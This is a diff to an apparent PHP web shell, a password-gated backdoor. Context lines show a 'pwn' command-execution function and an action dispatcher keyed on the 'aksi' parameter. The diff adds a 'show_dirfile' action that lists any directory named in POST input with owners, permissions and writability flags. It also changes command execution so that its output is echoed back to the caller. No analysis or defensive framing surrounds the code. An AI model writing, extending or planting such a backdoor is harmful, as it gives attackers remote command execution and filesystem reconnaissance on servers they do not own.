@@ -236,6 +236,60 @@ function pwn($cmd) {
     exit();
 }
 
+function perms($file){
+	$perms = fileperms($file);
+	if(($perms & 0xC000) == 0xC000){
+		// Socket
+		$info = 's';
+	}elseif(($perms & 0xA000) == 0xA000){
+		// Symbolic Link
+		$info = 'l';
+	}elseif(($perms & 0x8000) == 0x8000){
+		// Regular
+		$info = '-';
+	}elseif(($perms & 0x6000) == 0x6000){
+		// Block special
+		$info = 'b';
+	}elseif(($perms & 0x4000) == 0x4000){
+		// Directory
+		$info = 'd';
+	}elseif(($perms & 0x2000) == 0x2000){
+		// Character special
+		$info = 'c';
+	}elseif(($perms & 0x1000) == 0x1000){
+		// FIFO pipe
+		$info = 'p';
+	}else{
+		// Unknown
+		$info = 'u';
+	}
+	// Owner
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+	(($perms & 0x0800) ? 's' : 'x') :
+	(($perms & 0x0800) ? 'S' : '-'));
+	// Group
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+	(($perms & 0x0400) ? 's' : 'x') :
+	(($perms & 0x0400) ? 'S' : '-'));
+		
+	// World
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+	(($perms & 0x0200) ? 't' : 'x') :
+	(($perms & 0x0200) ? 'T' : '-'));
+	return $info;
+}
+
+function formatSize($bytes){
+	$types = array('B', 'KB', 'MB', 'GB', 'TB');
+	for($i = 0; $bytes >= 1024 && $i < (count($types) -1); $bytes /= 1024, $i++);
+	return(round($bytes, 2)." ".$types[$i]);
+}
 
 if($password === $get_password)
 { 
@@ -352,6 +406,109 @@ if($password === $get_password)
           echo "\n\n";
         }
     }
+    else if($aksi == "show_dirfile")
+    {
+        $folder = array();
+        $files = array();
+        $dir = $_POST['dir'];
+        
+        $scandir = scandir($dir);
+        
+        foreach($scandir as $pat){
+            $dtime = date("d/m/y G:i", filemtime("$dir/$pat"));
+            $is_ijo = is_writable($dir."/".$pat);
+            $size = "--";
+
+            if(function_exists('posix_getpwuid')) {
+                $downer = @posix_getpwuid(fileowner("$dir/$pat"));
+                $downer = $downer['name'];
+            } else {
+                //$downer = $uid;
+                $downer = fileowner("$dir/$pat");
+            }
+
+            if(function_exists('posix_getgrgid')) {
+                $dgrp = @posix_getgrgid(filegroup("$dir/$pat"));
+                $dgrp = $dgrp['name'];
+            } else {
+                $dgrp = filegroup("$dir/$pat");
+            }
+
+            if($is_ijo)
+            {
+                $cek_perms = perms($dir.'/'.$pat);
+                $status = "green";
+            }
+            else
+            {
+                $cek_perms = perms($dir.'/'.$pat);
+                $status = "red";
+            }
+
+            if(!is_dir($dir.'/'.$pat) || $pat == "." || $pat == "..") continue;
+
+            $folder[] = array(
+                "nama_folder" => $pat,
+                "size" => $size,
+                "Last_Modified" => $dtime,
+                "Permission" => $cek_perms,
+                "status" => $status,
+                "og" => $downer."/".$dgrp
+            );
+
+                
+        }
+        foreach ($scandir as $file) {
+            $dtime = date("d/m/y G:i", filemtime($dir."/".$file));
+            $is_ijo = is_writable($dir."/".$file);
+            $size = filesize($dir."/".$file);
+
+            if(function_exists('posix_getpwuid')) {
+                $downer = @posix_getpwuid(fileowner("$dir/$file"));
+                $downer = $downer['name'];
+            } else {
+                //$downer = $uid;
+                $downer = fileowner("$dir/$file");
+            }
+
+            if(function_exists('posix_getgrgid')) {
+                $dgrp = @posix_getgrgid(filegroup("$dir/$file"));
+                $dgrp = $dgrp['name'];
+            } else {
+                $dgrp = filegroup("$dir/$file");
+            }
+
+            if($is_ijo)
+            {
+                $cek_perms = perms($dir.'/'.$file);
+                $status = "green";
+            }
+            else
+            {
+                $cek_perms = perms($dir.'/'.$file);
+                $status = "red";
+            }
+
+            if(!is_file($dir.'/'.$file)) continue;
+            
+            $files[] = array(
+                "nama_file" => $file,
+                "size" => formatSize($size),
+                "Last_Modified" => $dtime,
+                "Permission" => $cek_perms,
+                "status" => $status,
+                "og" => $downer."/".$dgrp
+            );
+        }
+
+        $semua = array(
+            "folder" => $folder,
+            "file" => $files,
+        );
+
+        echo json_encode($semua);
+        
+    }
     else
     {
         $show_ds = (!empty($ds)) ? $ds : "NONE";
@@ -361,7 +518,7 @@ if($password === $get_password)
         }
         else
         {
-            trim(pwn($cmd));
+            echo trim(pwn($cmd));
         } 
     }
 	
